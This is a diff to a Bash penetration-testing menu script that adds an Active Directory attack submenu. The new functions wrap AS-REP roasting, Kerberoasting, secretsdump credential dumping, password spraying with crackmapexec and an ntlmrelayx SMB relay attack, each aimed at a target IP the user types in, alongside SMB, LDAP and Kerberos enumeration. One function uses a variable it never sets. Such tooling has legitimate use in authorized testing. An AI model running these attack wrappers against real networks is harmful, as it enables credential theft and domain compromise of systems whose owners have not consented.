@@ -1859,6 +1859,185 @@ osint_nuclei() {
     echo -e "${GREEN}[+] Nuclei scan completed. Results saved in $output_file${NC}"
 }
 
+# Function to check if port 445 is open
+check_port_445() {
+    if [[ ! $OPEN_PORTS =~ "445" ]]; then
+        echo -e "${YELLOW}[!] Warning: Port 445 is not detected as open.${NC}"
+        read -p "Do you want to continue? (y/n): " choice
+        if [[ $choice != "y" && $choice != "Y" ]]; then
+            return 1
+        fi
+    fi
+    return 0
+}
+
+# Function to show Active Directory tools
+show_ad_tools() {
+    check_port_445
+    if [ $? -ne 0 ]; then
+        return
+    fi
+
+    while true; do
+        echo -e "${BLUE}[+] Active Directory Tools:${NC}"
+        echo -e "1) BloodHound"
+        echo -e "2) ldapsearch"
+        echo -e "3) enum4linux"
+        echo -e "4) Impacket"
+        echo -e "5) CrackMapExec"
+        echo -e "6) SMB Enumeration"
+        echo -e "7) Kerberos Enumeration"
+        echo -e "8) DNS Enumeration"
+        echo -e "9) AS-REP Roasting"
+        echo -e "10) Password Spraying"
+        echo -e "11) SMB Relay Attack"
+        echo -e "12) LDAP Enumeration"
+        echo -e "13) Back to Main Menu"
+        read -p "Select an option: " ad_option
+
+        case $ad_option in
+            1) run_bloodhound ;;
+            2) run_ldapsearch ;;
+            3) run_enum4linux ;;
+            4) run_impacket ;;
+            5) run_cme ;;
+            6) smb_enumeration ;;
+            7) kerberos_enumeration ;;
+            8) dns_enumeration ;;
+            9) asrep_roasting ;;
+            10) password_spraying ;;
+            11) smb_relay ;;
+            12) ldap_enumeration ;;
+            13) break ;;
+            *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+        esac
+    done
+}
+
+# Function to run BloodHound
+run_bloodhound() {
+    echo -e "${BLUE}[+] Running BloodHound...${NC}"
+    sudo apt-get install bloodhound -y
+    neo4j start
+    bloodhound
+}
+
+# Function to run ldapsearch
+run_ldapsearch() {
+    read -p "Enter LDAP server address: " ldap_server
+    read -p "Enter search base (e.g., dc=example,dc=com): " search_base
+    echo -e "${BLUE}[+] Running ldapsearch...${NC}"
+    ldapsearch -x -H ldap://$ldap_server -b $search_base
+}
+
+# Function to run enum4linux
+run_enum4linux() {
+    read -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running enum4linux...${NC}"
+    enum4linux -a $target_ip
+}
+
+# Function to run Impacket tools
+run_impacket() {
+    echo -e "${BLUE}[+] Running Impacket tools...${NC}"
+    echo -e "1) GetNPUsers"
+    echo -e "2) GetUserSPNs"
+    echo -e "3) SecretsDump"
+    echo -e "4) SMBClient"
+    read -p "Select an Impacket tool: " impacket_option
+
+    case $impacket_option in
+        1)
+            read -p "Enter target IP: " target_ip
+            read -p "Enter domain name: " domain
+            read -p "Enter username: " username
+            GetNPUsers.py $domain/$username -no-pass -dc-ip $target_ip
+            ;;
+        2)
+            read -p "Enter target IP: " target_ip
+            read -p "Enter domain name: " domain
+            read -p "Enter username: " username
+            GetUserSPNs.py $domain/$username -dc-ip $target_ip
+            ;;
+        3)
+            read -p "Enter target IP: " target_ip
+            read -p "Enter domain name: " domain
+            read -p "Enter username: " username
+            read -s -p "Enter password: " password
+            secretsdump.py $domain/$username:$password@$target_ip
+            ;;
+        4)
+            read -p "Enter target IP: " target_ip
+            read -p "Enter domain name: " domain
+            read -p "Enter username: " username
+            read -s -p "Enter password: " password
+            smbclient.py $domain/$username:$password@$target_ip
+            ;;
+        *)
+            echo -e "${RED}Invalid option. Please try again.${NC}"
+            ;;
+    esac
+}
+
+# Function to run CrackMapExec
+run_cme() {
+    read -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running CrackMapExec...${NC}"
+    crackmapexec smb $target_ip
+}
+
+# Function for SMB Enumeration
+smb_enumeration() {
+    read -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running SMB Enumeration...${NC}"
+    smbclient -L \\$target_ip -N
+}
+
+# Function for Kerberos Enumeration
+kerberos_enumeration() {
+    read -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running Kerberos Enumeration...${NC}"
+    nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='YOUR_REALM' $target_ip
+}
+
+# Function for DNS Enumeration
+dns_enumeration() {
+    read -p "Enter domain: " domain
+    echo -e "${BLUE}[+] Running DNS Enumeration...${NC}"
+    dnsrecon -d $domain
+}
+
+# Function for AS-REP Roasting
+asrep_roasting() {
+    read -p "Enter domain: " domain
+    echo -e "${BLUE}[+] Running AS-REP Roasting...${NC}"
+    GetNPUsers.py -dc-ip $target_ip -no-pass $domain/
+}
+
+# Function for Password Spraying
+password_spraying() {
+    read -p "Enter target IP: " target_ip
+    read -p "Enter domain: " domain
+    read -p "Enter username list file: " user_list
+    read -s -p "Enter password: " password
+    echo -e "\n${BLUE}[+] Running Password Spraying...${NC}"
+    crackmapexec smb $target_ip -u $user_list -p $password
+}
+
+# Function for SMB Relay Attack
+smb_relay() {
+    read -p "Enter target IP: " target_ip
+    echo -e "${BLUE}[+] Running SMB Relay Attack...${NC}"
+    ntlmrelayx.py -smb2support -t $target_ip
+}
+
+# Function for LDAP Enumeration
+ldap_enumeration() {
+    read -p "Enter LDAP server address: " ldap_server
+    echo -e "${BLUE}[+] Running LDAP Enumeration...${NC}"
+    ldapsearch -x -H ldap://$ldap_server -b "dc=example,dc=com"
+}
+
 # Function to handle post-exploitation tasks
 post_exploitation() {
     echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
@@ -1988,7 +2167,7 @@ send_command() {
 }
 
 check_install_dependencies() {
-    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "wkhtmltopdf")
+    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "tmux" "wkhtmltopdf")
 
     echo -e "${BLUE}[+] Checking and installing dependencies...${NC}"
 
@@ -2030,12 +2209,13 @@ main_menu() {
         echo -e "6) Exploit Tools"
         echo -e "7) CheatSheets"
         echo -e "8) Hash Crack"
-        echo -e "9) Reverse Shell Generator"
-        echo -e "10) Post-Explotation"
-        echo -e "11) Download Tools"
-        echo -e "12) Generate Report"
-        echo -e "13) Check and Install Dependencies"
-        echo -e "14) Save & Exit"
+        echo -e "9) Active Directory Tools"
+        echo -e "10) Reverse Shell Generator"
+        echo -e "11) Post-Explotation"
+        echo -e "12) Download Tools"
+        echo -e "13) Generate Report"
+        echo -e "14) Check and Install Dependencies"
+        echo -e "15) Save & Exit"
         read -e -p "Option: " main_option
 
         clear
@@ -2067,21 +2247,24 @@ main_menu() {
                 crack_with_hashcat
                 ;;
             9)
+                show_ad_tools
+                ;;
+            10)
                 generate_reverse_shell
                 ;;
-            10) 
+            11) 
                 post_exploitation
                 ;;
-            11)
+            12)
                 download_tools
                 ;;
-            12)
+            13)
                 save_report
                 ;;
-            13)
+            14)
                 check_install_dependencies
                 ;;
-            14)
+            15)
                 save_results
                 echo -e "${GREEN}[+] Exiting the script.${NC}"
                 exit 0
